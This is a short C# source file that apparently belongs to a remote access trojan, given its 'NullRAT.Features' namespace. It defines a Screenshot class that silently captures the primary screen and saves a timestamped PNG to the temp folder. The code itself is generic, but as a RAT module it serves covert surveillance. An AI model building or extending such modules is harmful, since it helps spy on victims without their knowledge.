using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace NullRAT.Features
{
    public static class Screenshot
    {
        public static string Capture()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using Bitmap bmp = new Bitmap(bounds.Width, bounds.Height);
                using Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                string path = Path.Combine(Path.GetTempPath(), $"ss_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                bmp.Save(path, ImageFormat.Png);
                return $"Screenshot saved: {path}";
            }
            catch (Exception ex)
            {
                return $"Screenshot failed: {ex.Message}";
            }
        }
    }
}